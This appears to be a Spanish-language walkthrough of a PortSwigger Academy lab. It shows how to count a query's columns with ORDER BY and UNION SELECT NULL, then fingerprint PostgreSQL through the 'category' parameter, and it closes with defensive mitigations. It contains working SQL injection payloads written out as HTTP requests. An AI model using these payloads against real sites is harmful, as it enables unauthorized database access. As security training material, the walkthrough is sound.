# SQL injection UNION attack, determining the number of columns returned by the query

**Categoría:** SQLi  
**Dificultad:** Practitioner  
**Fuente:** PortSwigger Web Security Academy

***

# 🎯 Resumen

*   **Objetivo del lab**: Determinar el número de columnas de la consulta vulnerable utilizando un ataque `UNION` que devuelva una fila adicional con valores `NULL`.
*   **Vulnerabilidad principal**: SQL Injection en el parámetro `category`.
*   **Impacto esperado**: Base para ataques `UNION` posteriores que extraen datos de otras tablas.

***

# 🧭 Reconocimiento

*   **Mapa de la aplicación**: `/filter?category=<valor>` filtra productos por categoría y renderiza el resultado en la respuesta.
*   **Parámetro relevante**: `category`.
*   **Consulta SQL sospechada**:

    ```sql
    SELECT <col1>, <col2>, <col3>
    FROM products
    WHERE category = '<USER_INPUT>' AND released = 1
    ```
*   **Hipótesis**: La aplicación concatena la entrada sin parametrizar, permitiendo manipular la consulta con `ORDER BY` y `UNION SELECT`.

***

# 🛠️ Explotación paso a paso

## Paso 1 – Confirmar la inyección

*   **Qué hago**: Inyecto `'` al final del valor de `category`.
*   **Por qué funciona**: Si no está escapada, rompe la consulta y evidencia la inyección.
*   **Evidencia**: Error 500 (o mensaje SQL) en la respuesta.

***

## Paso 2 – Determinar el número de columnas con `ORDER BY`

*   **Qué hago**: Pruebo `ORDER BY 1`, `ORDER BY 2`, … hasta que la consulta falla:
    *   `ORDER BY 1` → OK
    *   `ORDER BY 2` → OK
    *   `ORDER BY 3` → OK
    *   `ORDER BY 4` → **500** (falla)
*   **Conclusión**: **La consulta devuelve 3 columnas visibles**.
*   **Por qué funciona**: Solicitar ordenar por un índice mayor al número de columnas produce error.

***

## Paso 3 – Corroborar con `UNION SELECT NULL`

*   **Qué hago**: Construyo un `UNION` con el mismo número de columnas (3) usando `NULL`:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- -
    Host: <lab-id>.web-security-academy.net
    ```
*   **Evidencia**: La página carga sin error y el lab se marca como **Solved**.

***

## Paso 4 – (Opcional) Identificar Motor BD y versión

*   **Qué hago**: Encuentro **qué columna acepta texto** (por ejemplo, la 2ª columna) y coloco una función de versión del SGBD.

*   **Payload**:

    ```http
    GET /filter?category=Gifts' UNION SELECT NULL,version(),NULL-- -
    Host: <lab-id>.web-security-academy.net
    ```

*   **Evidencia**:  
    `PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit`

*   **Por qué funciona**: `version()` en PostgreSQL devuelve la cadena con la versión; usar `NULL` en columnas no textuales evita conflictos de tipos.

***

# ✅ PoC mínima

```http
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- -
Host: <lab-id>.web-security-academy.net
```

***

# 🔒 Defensa

*   **Causas**: Entradas de usuario concatenadas directamente en la consulta SQL.
*   **Detección en logs**:
    *   Parámetros con patrones `UNION SELECT`, `ORDER BY <n>`.
    *   Respuestas con errores SQL coincidentes en el tiempo.
*   **Mitigación recomendada**:
    *   **Prepared statements** / consultas parametrizadas.
    *   Validación por *allow-list* sobre parámetros de filtrado.
    *   Minimizar detalles de errores en respuestas; registrar detalladamente en backend.
    *   Principio de mínimo privilegio en el rol de BD.

***

# 📝 Notas y trampas

*   Si `UNION SELECT NULL,...` falla, **ajusta el número de `NULL`** hasta igualar las columnas de la consulta original.
*   **Tipos importan**: además del número, debes casar **tipos**. Usa `NULL` para columnas no textuales y coloca la cadena (o función) solo en la columna que renderiza texto.
*   Para identificar **qué columna es “reflejable”** (se ve en la UI), alterna colocando una cadena única (`'xYz'`) en cada posición del `UNION`.
*   En PostgreSQL, la función de versión es `version()`; en MySQL `@@version`/`version()`, en Oracle `banner` desde `v$version`, en MSQL Server `@@version`.

***

# 📚 Referencias

*   [PortSwigger Lab – SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
*   [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
